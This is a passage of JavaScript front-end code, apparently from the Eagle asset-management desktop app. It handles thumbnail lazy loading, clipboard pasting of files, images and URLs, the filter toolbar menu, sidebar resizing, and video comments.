            doScrollTimeout = setTimeout(function () {
                // 兩個螢幕高度時，顯示 scrollTop 按鈕
                // var scrollTop = $boxContainer.scrollTop();
                var scrollTop = ig._watcher._prevPos;
                if (scrollTop >= 200) {
                    if (!$scrollTopButton.hasClass("show")) {
                        $scrollTopButton.addClass("show");
                    }
                }
                else {
                    if ($scrollTopButton.hasClass("show")) {
                        $scrollTopButton.removeClass("show");
                    }
                }
            }, 250);
            showImagesTimeout = setTimeout(function () {
                showImages();
            }, delay);
        });

        let showImagesMouseWheelToggle = false;
        $boxContainer.on("mousewheel", throttle(function(event) {
            if (hardDiskSpeed === "fast") {
                var wheelDelta = Math.abs(event.originalEvent.wheelDelta);
                if (wheelDelta < 50) {
                    if (showImagesMouseWheelToggle) {
                        console.log("force show images");
                        showImages(true);
                        showImagesMouseWheelToggle = false;
                    }
                }
                else {
                    showImagesMouseWheelToggle = true;
                }
            }
        }, 100));

        var showSidebarScrollToTopTimeout;
        var $sidebarScrollTopButton = $("#sidebar-scroll-to-top");
        var $sidebarContainer = $("#sidebar-item-container");
        $sidebarContainer.on("scroll.scrollToTop", function() {
            clearTimeout(showSidebarScrollToTopTimeout);
            showSidebarScrollToTopTimeout = setTimeout(function () {
                var scrollTop = $sidebarContainer.scrollTop();
                if (scrollTop >= 360) {
                    if (!$sidebarScrollTopButton.hasClass("show")) {
                        $sidebarScrollTopButton.addClass("show");
                    }
                }
                else {
                    if ($sidebarScrollTopButton.hasClass("show")) {
                        $sidebarScrollTopButton.removeClass("show");
                    }
                }
            }, 333);
        });

        var enlargeThumbnailsTimeout;
        function enlargeThumbnails () {
        	clearTimeout(enlargeThumbnailsTimeout);
        	enlargeThumbnailsTimeout = setTimeout(() => {
        		console.time("enlargeThumbnails");
        		var $boxs = $(".box.show.jpg, .box.show.png, .box.show.webp, .box.show.bmp").not(".enlarge-thumbnail");
            	var $imgs = $boxs.find(".thumbnail img");

            	$imgs.each(function () {
            		var $self = $(this);
            		var $box = $self.parent().parent();
            		let rawsrc = $self.attr('raw');
	            	if (rawsrc) {
	            		$self.attr('src', rawsrc);
	            		$box.addClass("enlarge-thumbnail");
	            	}
            	});
            	console.timeEnd("enlargeThumbnails");
        	}, 600);
        }

        var shrinkThumbnailsTimeout;
        function shrinkThumbnails () {
        	clearTimeout(shrinkThumbnailsTimeout);
        	shrinkThumbnailsTimeout = setTimeout(() => {
        		console.time("shrinkThumbnails");
        		var $boxs = $(".box.enlarge-thumbnail.jpg, .box.enlarge-thumbnail.png, .box.enlarge-thumbnail.webp, .box.enlarge-thumbnail.bmp");
            	var $imgs = $boxs.find(".thumbnail img");

            	$imgs.each(function () {
            		var $self = $(this);
            		var $box = $self.parent().parent();
            		let lsrc = $self.attr('lsrc');
	            	if (lsrc) {
	            		$self.attr('src', lsrc);
	            		$box.removeClass("enlarge-thumbnail");
	            	}
            	});
            	console.timeEnd("shrinkThumbnails");
        	}, 600);
        }

        $scope.showImages = showImages;
        var showImagesTimeout2;
        var lastShowImageTimeout;
        var avgShowImageSum = 0;
        var avgShowImageCount = 0;
        var lastShowImageAvg = 0;
        function showImages(ignoreTimeout) {
            if (!ignoreTimeout) {
                clearTimeout(showImagesTimeout2);
            }
            showImagesTimeout2 = setTimeout(function () {

                var $boxContainer = $boxContainer || $("#box-container");
                var $boxs = $boxContainer.find(".box");
                if ($boxs.length === 0) return;
                
                var $subFolderContainer = $("#sub-folder-container");
                var subFolderListHeight = ($subFolderContainer[0] && $subFolderContainer[0].clientHeight) || 0;
                var scrollTop = (ig._watcher._prevPos || $boxContainer[0].scrollTop) + window.innerHeight / 2 - 100 - subFolderListHeight;
                var windowHeight = window.outerHeight;
                var loadArea = windowHeight * 1.2;

                // Note，首次载入不需要载入太多图片，这样可以大幅减少资料夹切换、刷新页面的成本
                if (scrollTop > window.innerHeight / 2) {
                    loadArea = windowHeight * 1.5;
                }
                var limitSize = 200;
                if (hardDiskSpeed === "fast") {
                    limitSize = 240;
                }

                remainShowImageCount = 0;

                $boxs = $boxs.sort(function (a, b) {
                    // var y1 = parseInt(a.getAttribute('posY') || 0);
                    // var y2 = parseInt(b.getAttribute('posY') || 0);
                    var y1 = a.getAttribute('posY') || 0;
                    var y2 = b.getAttribute('posY') || 0;
                    var diff1 = Math.abs(scrollTop - y1);
                    var diff2 = Math.abs(scrollTop - y2);
                    if(diff1 > diff2) return 1;
                    if(diff1 < diff2) return -1;
                    return 0;
                });

                var lastBox = $boxs[0];
            	var lastItem = $scope.getItemByElement(lastBox);
            	if ($scope.selected.length === 0 && lastItem) {
            		setLastItem(lastItem);
	            }

                // console.log(`box length before: ${$boxs.length}`)
                // $boxs = $boxs.filter(":not(.show)");
                $boxs = $boxs.filter(function (index) {
                    let box = this;
                    if (box.hasAttribute('loading')) return false;
                    if (box.classList.contains('show')) return false;
                    // 螢幕外的就不載入
                    if (Math.abs(scrollTop - box.getAttribute('posY')) > loadArea) {
                        return false;
                    }
                    return true;
                });
                // $boxs = $boxs.slice(0, limitSize);
                // console.log(`box length after: ${$boxs.length}`)

                var $images = $boxs.find("img");

                remainShowImageCount += $images.length;
                $images.each(function(index) {
                    var self = this;
                    var $self = $(this);
                    var $box = $self.parent().parent();

                    // 硬盘比较快的话，使用高速模式
                    if (!hardDiskSpeed || hardDiskSpeed === "normal") {
                        if (index <= 30) delay = 1;
                        else if (index <= 60) delay = index * 2;
                        else delay = index * 4;    
                    }
                    else {
                        if (index <= 40) delay = 0;
                        else if (index <= 60) delay = index * 2;
                        else delay = index * 4;    
                    }
                    
                    setTimeout(function () {
                        // 如果用户重新滚动，之前载入的内容一律不载
                        if (!ignoreTimeout) {
                            if (lastShowImageTimeout !== showImagesTimeout) { 
                                remainShowImageCount--; 
                                return; 
                            }
                        }

                        // 螢幕外的就不載入
                        if (Math.abs(scrollTop - $box[0].getAttribute('posY')) > loadArea) {
                            $box[0].removeAttribute("loading");
                            return
                        }

                        // 已經移除的內容，不載入
                        if (!$self[0].isConnected) {
                            $box[0].removeAttribute("loading");
                            return;
                        }

                        var startTime = Date.now();

                        var showFileIcon = $self[0].hasAttribute("ext-icon");
                        if (showFileIcon) {
                            let boxId = $box[0].getAttribute("data-box-id");
                            let item = $scope.itemMappings[boxId];
                            let rawPath = FileUrlHelper.getRawPath(item);
                            $box[0].setAttribute("loading", true);
                            FILE_ICON.getFileThumbnail(item, rawPath, function (base64) {
                                if (base64) {
                                    $self.attr('src', base64);
                                    $box.addClass("show");
                                    $box[0].removeAttribute("loading");
                                }
                                remainShowImageCount--;
                            });
                        }
                        else {
                            // 如果列表尺寸較大時，優先使用原圖片作為縮略圖呈現
                            $box[0].setAttribute("loading", true);
                            if ($scope.imageSize.height > 440) {
                                let rawsrc = $self.attr('raw');
                                if (rawsrc) {
                                    $self.attr('src', rawsrc);
                                    $box.addClass("enlarge-thumbnail");
                                }
                                else {
                                    $self.attr('src', $self.attr('lsrc'));
                                }
                            }
                            else {
                                $self.attr('src', $self.attr('lsrc'));
                            }

                            if (self.complete) {
                                requestAnimationFrame(() => {
                                    $box.addClass("show");
                                    $box[0].removeAttribute("loading");
                                });
                                remainShowImageCount--;
                            }
                            else {
                                $self.on('load', function() {
                                    var diffTime = Date.now() - startTime;
                                    remainShowImageCount--;
                                    requestAnimationFrame(() => {
                                        $box.addClass("show with-animation");
                                        $box[0].removeAttribute("loading");
                                        $self.parent().removeClass("dummy").prop("title", "");
                                    });
                                    $self.off('load').off('error');
                                    avgShowImageCount++;
                                    avgShowImageSum += diffTime;

                                    // console.log(`loaded: ${diffTime}ms, remain: ${remainShowImageCount}`);
                                    // 智能切换载入列表逻辑
                                    if (remainShowImageCount === 0) {
                                        var avgShowImageSpeed = (avgShowImageSum + lastShowImageAvg) / (avgShowImageCount + 1);
                                        // console.log(`avg: ${avgShowImageSpeed}ms`);

                                        SlowNotify.calculate(avgShowImageSpeed);

                                        avgShowImageCount = 0;
                                        avgShowImageSum = 0;
                                        lastShowImageAvg = avgShowImageSpeed;
                                        if (diffTime < 200) {
                                            // 硬盘很快
                                            hardDiskSpeed = "fast";
                                            // console.log("切换至快速载入模式");
                                        }
                                        else {
                                            hardDiskSpeed = "normal";
                                            // console.log("切换至慢素载入模式");
                                        }
                                    }
                                });
                                $self.on('error', function() {
                                    remainShowImageCount--;
                                    $box.addClass("show");
                                    $box[0].removeAttribute("loading");
                                    $self.off('load').off('error');
                                });
                            }

                        }
                    }, delay);
                });

            }, 15);
            lastShowImageTimeout = showImagesTimeout;
        };

        var mousemoveTimeout;
        document.addEventListener('mousemove', function(e){
            windowMouseX = e.pageX
            windowMouseY = e.pageY;
            if (isMouseMoving) return;
            isMouseMoving = true;
            clearTimeout(mousemoveTimeout);
            mousemoveTimeout = setTimeout(function () {
                isMouseMoving = false;
            }, 500);
        }, false);

        document.body.addEventListener('mouseout', function(e) {
            if (!e.relatedTarget && !e.toElement) {
                if ($(".sidebar.hover-show")) {
                    $(".sidebar.hover-show").removeClass("hover-show");
                }
            }
        });

        $(window).on("paste", function(event) {

            var url = "";
            var name = "";
            var fileurl = "";

            if ($("input:focus").length > 0) { return; }
            if ($("[contenteditable]:focus").length > 0) { return; }

            if (process.platform == 'darwin') {

                var PASTEBOARD_FILE_URL = 'NSFilenamesPboardType';
                var PASTEBOARD_URL_NAME = 'public.url-name';
                var PASTEBOARD_URL = 'public.file-url';

                var fileurlBuf = clipboard.readBuffer(PASTEBOARD_FILE_URL);
                var nameBuf = clipboard.readBuffer(PASTEBOARD_URL_NAME);
                var urlBuf = clipboard.readBuffer(PASTEBOARD_URL);

                try {
                    fileurl = fileurlBuf.toString();
                    name = nameBuf.toString();
                    url = urlBuf.toString();
                } catch (err) {}
            }

            var params = {
                url: url,
                name: name,
                fileurl: fileurl,
                folder: $scope.currentFolder
            };

            if (fileurl) {
                var files = [];
                $(`<div>${fileurl}</div>`).find("plist").find("string").each(function() {
                    files.push($(this).text());
                })
                if (files.length > 0) {
                    files.forEach(function() {
                        $scope.uploadQueue.push({});
                    });
                    $scope.showUploadQueue();
                    ipcRenderer.send('paste-paths', {
                        folder: $scope.currentFolder,
                        files: files
                    });
                    if ($scope.currentFolder) { electronLog.info(`[app] Paste ${files.length} files from clipboard to folder ${$scope.currentFolder.name}(${$scope.currentFolder.id})`); }
                    else { electronLog.info(`[app] Paste ${files.length} files from clipboard`); }
                }
                $scope.$evalAsync();
                return;
            }
            var url = clipboard.readText();
            var image = clipboard.readImage();
            if (image && !image.isEmpty()) {
                $scope.showUploadQueue();
                if (process.platform !== 'darwin') {
                    // ipcRenderer.send('paste-image', params);
                    $scope.showUploadQueue();
                    ipcRenderer.send('read-win-files', {
                        folder: $scope.currentFolder,
                        params: params
                    });
                }
                else {
                    ipcRenderer.send('paste-image', params);
                    if ($scope.currentFolder) { electronLog.info(`[app] Paste 1 file from clipboard to folder ${$scope.currentFolder.name}(${$scope.currentFolder.id})`); }
                    else { electronLog.info(`[app] Paste 1 file from clipboard`); }
                }
            }
            else {
                if (is.url(url)) {

                    // 如果当前 focus 在输入框中，就不处理
                    if (document?.activeElement?.tagName === "INPUT" || document?.activeElement?.tagName === "TEXTAREA") {
                        return;
                    }

                    let folders = [];
                    let tags = [];
                    if ($scope.currentFolder) {
                        folders = [$scope.currentFolder.id];
                        tags = $scope.currentFolder.extendTags || [];
                    }
                    $scope.uploadQueue.push({});
                    $scope.showUploadQueue();
                    $.ajax({
                        type: "HEAD",
                        url : url,
                        timeout: 10000,
                        complete: function(xhr, textStatus) {
                            let contentType = xhr.getResponseHeader('Content-Type') || "";
                            if (contentType.indexOf("image") > -1 ) {
                                IPCHelper.send('upload-url', {
                                    url: url,
                                    folders: folders,
                                    tags: tags,
                                });
                            }
                            // 添加書籤
                            else if (contentType.indexOf("html") > -1) {
                                var data = {
                                    id: guid(),
                                    url: url,
                                    tags: tags || [],
                                    modificationTime: Date.now(),
                                    folders: folders,
                                };
                                ipcRenderer.sendTo(backgroundWindowID, 'url-from-extension', data);
                            }
                            else {
                                $scope.hideUploadQueue();
                            }
                        } 
                    });
                }
                else if (process.platform !== 'darwin') {
                    $scope.showUploadQueue();
                    ipcRenderer.send('read-win-files', {
                        folder: $scope.currentFolder,
                        params: params
                    });
                }
            }
        });
        $scope.fixUtils = {};
        $scope.lastItemStates = {};
        $scope.isLoading = false;
        $scope.isMaximize = currentWindow.isMaximized();
        
        $scope.isOpenWebpagePanel = false;
        $scope.viewMode = localStorage.getItem(`eagle.viewMode.${$scope.rootDir}`) || "all";
        $scope.tagViewMode = "ALL";
        $scope.tagViewModeName = "ALL";
        $scope.tagViewLayoutMode = localStorage.getItem("TAGVIEW_LAYOUT") || "INLINE"; // INLINE, LIST
        $scope.errorList = [];
        $scope.localhostError = false;
        $scope.showSlowNotify = false;
        $scope.showNTFSWarning = false;
        $scope.navigationHistory = [];
        $scope.navigationHistoryIndex = 0;
        $scope.keyword = "";
        $scope.keywordDebounce = 300;
        $scope.keywordSuggestions = [];
        $scope.tagCollapseGroups = {};
        $scope.historySearchKeywords = [];
        $scope.isOpenSavedFilter = false;
        $scope.containTags = [];
        $scope.containFolders = [];
        $scope.libraryHistory = [];
        $scope.eagle = eagle;
        $scope.openFilterAddContextMenu = function () {
            $scope.openFilter();
            $("#filter-toolbar-overlay").click();

            const pinFilter = (id, pinned) => {
                eagle.filter.pinned[id] = pinned;
                eagle.filter.savePinned();
                setTimeout(function () { $scope.updateContainerHieght(); }, 50);
            };

            const openFilter = (id) => {
                $(`#${id}-filter-item`).click();
                setTimeout(function () { $scope.updateContainerHieght(); }, 50);
            }

            let items = [
                // 顏色
                {
                    id: "color",
                    label: i18n.__('filter.color'),
                    keywords: "color palette 顏色 調色盤",
                    icon: 'ic-filter-item-color.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['color'],
                    toggle: (pinned) => {
                        pinFilter('color', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('color');
                    }
                },
                // 標籤
                {
                    id: "tags",
                    label: i18n.__('filter.tags'),
                    keywords: "tags label 標籤",
                    icon: 'ic-filter-item-tag.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['tags'],
                    toggle: (pinned) => {
                        pinFilter('tags', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('tags');
                    }
                },
                // 資料夾
                {
                    id: "folders",
                    label: i18n.__('filter.folders'),
                    keywords: "folders dir 資料夾 文件夾",
                    icon: 'ic-filter-item-folder.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['folders'],
                    toggle: (pinned) => {
                        pinFilter('folders', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('folders');
                    }
                },
                // 形狀
                {
                    id: "shape",
                    label: i18n.__('filter.orientation'),
                    keywords: "shape orientation 形狀 方向",
                    icon: 'ic-filter-item-shape.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['shape'],
                    toggle: (pinned) => {
                        pinFilter('shape', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        $scope.toggleShapeFilter();
                        $scope.$evalAsync();
                    }
                },
                // 評分
                {
                    id: "rating",
                    label: i18n.__('filter.rating'),
                    keywords: "rating rate star 評分 星等 星級",
                    icon: 'ic-filter-item-rating.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['rating'],
                    toggle: (pinned) => {
                        pinFilter('rating', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('rating');
                    }
                },
                // 類型
                {
                    id: "types",
                    label: i18n.__('filter.types'),
                    keywords: "types type extenstion format 類型 格式 副檔名",
                    icon: 'ic-filter-item-ext.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['types'],
                    toggle: (pinned) => {
                        pinFilter('types', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('types');
                    }
                },
                // 時間
                {
                    id: "import",
                    label: i18n.__('filter.import'),
                    keywords: "date time import 時間 導入 匯入",
                    icon: 'ic-filter-item-import.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['import'],
                    toggle: (pinned) => {
                        pinFilter('import', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('import');
                    }
                },
                // 修改時間
                {
                    id: "mtime",
                    label: i18n.__('filter.mtime'),
                    keywords: "mtime time modify 修改時間",
                    icon: 'ic-filter-item-modify.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['mtime'],
                    toggle: (pinned) => {
                        pinFilter('mtime', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('mtime');
                    }
                },
                // 解析度
                {
                    id: "resolution",
                    label: i18n.__('filter.resolution'),
                    keywords: "resolution dimension 解析度 尺寸 分辨率",
                    icon: 'ic-filter-item-resolution.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['resolution'],
                    toggle: (pinned) => {
                        pinFilter('resolution', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('resolution');
                    }
                },
                // 時長
                {
                    id: "duration",
                    label: i18n.__('filter.duration'),
                    keywords: "duration time 時長 時間",
                    icon: 'ic-filter-item-duration.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['duration'],
                    toggle: (pinned) => {
                        pinFilter('duration', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('duration');
                    }
                },
                // 檔案大小
                {
                    id: "size",
                    label: i18n.__('filter.fileSize'),
                    keywords: "size filesize 檔案大小 文件大小",
                    icon: 'ic-filter-item-size.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['size'],
                    toggle: (pinned) => {
                        pinFilter('size', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('size');
                    }
                },
                // 註解
                {
                    id: "annotation",
                    label: i18n.__('filter.comments'),
                    keywords: "comments comment 註解 標注 筆記 annotation",
                    icon: 'ic-filter-item-comment.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['annotation'],
                    toggle: (pinned) => {
                        pinFilter('annotation', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('annotation');
                    }
                },
                // 筆記
                {
                    id: "note",
                    label: i18n.__('filter.annotation'),
                    // 日文版關鍵字
                    keywords: "note 筆記 註解 註釋",
                    icon: 'ic-filter-item-note.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['note'],
                    toggle: (pinned) => {
                        pinFilter('note', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('note');
                    }
                },
                // 網址
                {
                    id: "url",
                    label: i18n.__('filter.url'),
                    keywords: "url link website 網址 連結 鏈接",
                    icon: 'ic-filter-item-url.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['url'],
                    toggle: (pinned) => {
                        pinFilter('url', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('url');
                    }
                },
                // 字型
                {
                    id: "fontActivated",
                    visible: !!eagle.filter.filterExtensions['font'],
                    label: i18n.__('filter.fontActivated'),
                    keywords: "font 字型 字體",
                    icon: 'ic-filter-item-font.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['fontActivated'],
                    toggle: (pinned) => {
                        pinFilter('fontActivated', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('fontActivated');
                    }
                },
                // BPM 
                {
                    id: "bpm",
                    visible: !!eagle.filter.filterExtensions['audio'],
                    label: "BPM",
                    keywords: "bpm 節拍 節奏",
                    icon: 'ic-filter-item-bpm.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['bpm'],
                    toggle: (pinned) => {
                        pinFilter('bpm', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('bpm');
                    }
                },
                // 相機
                {
                    id: "camera",
                    visible: !!eagle.filter.filterExtensions['raw'],
                    label: i18n.__('filter.camera'),
                    keywords: "camera 相機 攝影機",
                    icon: 'ic-filter-item-camera.svg',
                    role: "toggle",
                    pinned: eagle.filter.pinned['camera'],
                    toggle: (pinned) => {
                        pinFilter('camera', pinned);
                        $scope.$evalAsync();
                    },
                    click: () => {
                        openFilter('camera');
                    }
                },
            ];

            items = items.sort(function (a, b) {
                let aIndex = eagle.filter.toolbar.findIndex(function (item) {
                    return item.type === a.id;
                });
                let bIndex = eagle.filter.toolbar.findIndex(function (item) {
                    return item.type === b.id;
                });
                return aIndex - bIndex;
            });
            
            ContextMenu.open({
                items: items,
                showSearch: true,
                sortable: true,
                sortableHelper: true,
                onSorted: (items) => {
                    if (!items) return;
                    if (eagle.filter.toolbar && eagle.filter.toolbar.length > 0) {
                        let toolbarOrders = [];
                        items.forEach((item) => {
                            toolbarOrders.push(item.id);
                        });
                        localStorage.setItem("eagle.filter.toolbar.orders", JSON.stringify(toolbarOrders));
                        eagle.filter.initOrders();
                        $scope.$evalAsync();
                    }
                }
            });
        };

        $scope.toggleExtFilter = function (ext) {
            if (!eagle.filter.filterRules.type[ext]) {
                eagle.filter.filterRules.type[ext] = true;
            }
            else {
                delete eagle.filter.filterRules.type[ext];
            }
        };

        // NOTE: 這個是批次篩選窗口的變數
        $scope.filterType = "undefined";

        eagle.filter.filterRules.import.type = "undefined";
        eagle.filter.filterRules.tag.includes = [];
        eagle.filter.filterRules.tag.exclude = [];
        eagle.filter.filterRules.folder.includes = {};
        eagle.filter.filterRules.folder.exclude = {};
        eagle.filter.filterCameras = [];
        eagle.filter.filterCamerasMapping = {};
        eagle.filter.filterExtensions = {};
        eagle.filter.filterRules.file.unit = "kb";
        eagle.filter.filterRules.duration.unit = "s";
        
        $scope.folderKeyword = "";

        eagle.filter.filterRules.import.selectedMonths = {};
        eagle.filter.filterRules.mtime.selectedMonths = {};
        $scope.page = 1;
        $scope.loadMoreDisable = false;
        $scope.isCommentMode = false;
        $scope.isCropMode = false;
        $scope.colorDistancesMap = {};
        $scope.boxContianerWidth;
        $scope.boxContianerHeight;
        // var listSliderTimeout;
        $scope.onListSizeChange = throttle(function () {
            // clearTimeout(listSliderTimeout);
            // listSliderTimeout = setTimeout(function () {
                $scope.boxListSizeChange();
                saveListHeight($scope.imageSize.height);
                $scope.checkListItemsLessThanContainer();
            // }, 15);
        }, 100, true);

        var boxListSizeChangeTimeout;
        $scope.boxListSizeChange = function () {
            let height = $scope.imageSize.height;
            height = Math.floor(height / 5) * 5;
            if (($scope.layout === "GridLayout" || $scope.layout === "SquareLayout") && ig._layout) {
                clearTimeout(boxListSizeChangeTimeout);
                boxListSizeChangeTimeout = setTimeout(function () {
                    $("#box-container").attr("box-size", height);
                    $scope.relayout();
                    $scope.adjustLayoutWidth(0);
                    showImages();
                }, 33);
            }
            else {
                $scope.changeListHeight(height);
            }
        };

        $scope.containerSize = {
            sidebar: 240
        };

        var historySearchKeywords = localStorage.getItem("historySearchKeywords");
        if (historySearchKeywords) {
            try {
                $scope.historySearchKeywords = JSON.parse(historySearchKeywords);
            }
            catch (err) {
                $scope.historySearchKeywords = [];
            };
        }

        if (localStorage.getItem("eagle.containerSize.sidebar")) {
            $scope.containerSize.sidebar = parseInt(localStorage.getItem("eagle.containerSize.sidebar"));
            if ($scope.containerSize.sidebar < 200) $scope.containerSize.sidebar = 200;
            $rootScope.$broadcast('$$rebind::refreshContainSize');
        }

        if (localStorage.getItem("eagle.containerSize.tagSidebar")) {
            $scope.containerSize.tagSidebar = parseInt(localStorage.getItem("eagle.containerSize.tagSidebar"));
            $rootScope.$broadcast('$$rebind::refreshContainSize');
        }

        if (localStorage.getItem("eagle.containerSize.tagFilter")) {
            $scope.containerSize.tagFilter = parseInt(localStorage.getItem("eagle.containerSize.tagFilter"));
            $rootScope.$broadcast('$$rebind::refreshContainSize');
        }

        var onTagFilterResizeTimeout;
        $scope.onTagFilterResize = function(e, ui) {
            if (ui && ui.size.height >= 100) {
                $scope.containerSize.tagFilter = ui.size.height;
                clearTimeout(onTagFilterResizeTimeout);
                onTagFilterResizeTimeout = setTimeout(function () {
                    localStorage.setItem("eagle.containerSize.tagFilter", ui.size.height);
                }, 1000);
            }
        };

        var onSidebarResizeTimeout;
        $scope.onSidebarResize = function(e, ui) {
            if (ui && ui.size.width >= 200) {
                $scope.containerSize.sidebar = ui.size.width;
                $rootScope.$broadcast('$$rebind::refreshContainSize');
                $scope.updateSliderPosition();
                clearTimeout(onSidebarResizeTimeout);
                onSidebarResizeTimeout = setTimeout(function () {
                    $scope.relayout();
                    $scope.offsetScrollbar(30);
                    localStorage.setItem("eagle.containerSize.sidebar", ui.size.width);
                }, 500);
            }
        };

        var onTagSidebarResizeTimeout;
        $scope.onTagSidebarResize = function(e, ui) {
            if (ui && ui.size.width >= 200) {
                $scope.containerSize.tagSidebar = ui.size.width;
                $rootScope.$broadcast('$$rebind::refreshContainSize');
                // $scope.updateSliderPosition();
                clearTimeout(onTagSidebarResizeTimeout);
                onTagSidebarResizeTimeout = setTimeout(function () {
                    // $scope.relayout();
                    // $scope.offsetScrollbar(30);
                    localStorage.setItem("eagle.containerSize.tagSidebar", ui.size.width);
                }, 500);
            }
        };

        $scope.toggleCommentMode = function (event) {
            event.preventDefault();
            $scope.isCommentMode = !$scope.isCommentMode;
        }
        $scope.switchToPreviewMode = function() {
            $scope.isCommentMode = false;
        };
        $scope.switchToCommentMode = function(comment) {
            if ($scope.isCropMode) return;
            $scope.isCommentMode = true;
            // 自动滚动到 annotation 处
            if (comment && comment.y) {
                $("#detail-container").smoothZoom('goToY', -comment.y * $scope.imageSize.zoomRatio / 100);
            }
        };
        // TODO:inspector
        $scope.addVideoComment = function (video, videoElem) {

        	if (!video || !videoElem) return;

        	videoElem.pause();

        	swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon create"></div>
                        <h4 class="alert-title">${i18n.__('dialog.videoComment.title')}</h4>
                    </div>
                `,
                input: 'textarea',
                inputPlaceholder: i18n.__("dialog.videoComment.placeholder"),
                allowEnterKey: false,
                showCloseButton: false,
                showCancelButton: true,
                allowOutsideClick: false,
                focusConfirm: false,
                focusCancel: false,
                padding: 10,
                position: 'bottom',
                width: 400,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__("dialog.videoComment.save"),
                cancelButtonText: i18n.__("general.cancel"),
            }).then(function(result) {

                if (!result) return;

                var comment = {
                    id: guid(),
                    duration: videoElem.currentTime,
                    annotation: result,
                    lastModified: Date.now()
                }

                if (!$scope.current.comments) {
                    $scope.current.comments = [];
                }

                $scope.current.comments.push(comment);
                $scope.current.comments = $scope.current.comments.sort(function (a, b) {
                	var da = a.duration;
                	var db = b.duration;
                	if(da > db) return 1;
                    if(da < db) return -1;
                    return 0;
                })
                $rootScope.$broadcast("REFRESH_VIDEO_COMMENTS");
                $scope.updateItemView(video);
                $scope.$evalAsync();

                ipcRenderer.send('image-change', $scope.current);
            })
        };

        $scope.onEvent = function(eventName, eventLabel, eventValue) {

        };

        var allTags = {};
        $scope.MAX_LIST_WIDTH = 900;
        $scope.MAX_DIMENSION = 120000000;
        $scope.isHideMainNav = true;	// 3.0 侧栏
        $scope.isHideSidebar = false;
        $scope.isHideSubFolder = true;
        $scope.isHideNavigator = false;
        $scope.unlockPassword = "";
        $scope.len = 100;
        $scope.sidebarList = [];
        $scope.sidebarIndex;
        $scope.all = [];
        $scope.trash = [];
        $scope.untaggedCount = 0;
        $scope.unfiledCount = 0;
        $scope.images = [];
        $scope.selected = [];
        $scope.selectedMappings = {};
        $scope.lockedImages = {};
        $scope.filtereds = [];
        $scope.allData = [];
        $scope.shuffle = [];
        $rootScope.selectedFolders = [];
        $rootScope.selectedFoldersMappings = {};
        $rootScope.selectedSmartFolders = [];
        $rootScope.selectedSmartFoldersMappings = {};
        $scope.folderMappings = {};
        $scope.smartFolderMappings = {};
        $scope.uploadQueue = [];
        $scope.finishQueue = [];
        $scope.finishGenerateQueue = [];
        $scope.regenerateThumbnailQueue = [];
        
        $scope.duplicateQueue = [];
        $rootScope.currentFocus = "sidebar";
        $scope.showSubfolderContent = false;
        $scope.showName = false;
        $scope.showMetas = false;
        $scope.showAnnotation = true;
        $scope.showFileExtension = true;
        $scope.showFileExtensionLabel = true;
        $scope.orderBy = localStorage.getItem("eagle.list.orderBy") || "IMPORT";
        $scope.orderByName = i18n.__(`context.order.orderBy>${$scope.orderBy.toLowerCase()}`);
        $scope.isSearchScopeName = true;
        $scope.isSearchScopeFolderName = true;
        $scope.isSearchScopeFolderDesc = true;
        $scope.isSearchScopeExt = true;
        $scope.isSearchScopeTag = true;
        $scope.isSearchScopeUrl = true;
        $scope.isSearchScopeAnnotation = true;
        $scope.isSearchScopeNote = true;
        $scope.listMetaType = localStorage.getItem("eagle.list.meta.type") || "RESOLUTION";
        $scope.sortIncrease = true;
        $scope.layout = "";
        $scope.layoutOptions = localStorage["eagle.list.layout.options"] || "Fit";
        $scope.lastImageHeight;
        $scope.paletteQueuePaused = false;
        $scope.paletteQueueDelay = 20;
        
        // Grid Layout 相关
        $scope.itemMappings = {};
        $scope.modifiedMappings = {};
        $scope.options = {
            page: 60,           // 每页数量
            preload: 1,         // 预先载入页次，如果填写 3 表示载入 page x 3 个内容
            align: "left"     // 瀑布流排版对其方式
        };

        $scope.folderIcons = [

            // 集合、多媒体、工具
            { type: 'icon' },
            { type: 'icon', icon: 'library' },
            { type: 'icon', icon: 'box' },
            { type: 'icon', icon: 'grid' },
            { type: 'icon', icon: 'layer' },
            { type: 'icon', icon: 'briefcase' },
            { type: 'icon', icon: 'photo' },
            { type: 'icon', icon: 'photos' },
            { type: 'icon', icon: 'video' },
            { type: 'icon', icon: 'film' },
            { type: 'icon', icon: 'film2' },
            { type: 'icon', icon: 'film3' },
            { type: 'icon', icon: 'music' },
            { type: 'icon', icon: 'book' },
            { type: 'icon', icon: 'book2' },
            { type: 'icon', icon: 'bookshelf' },
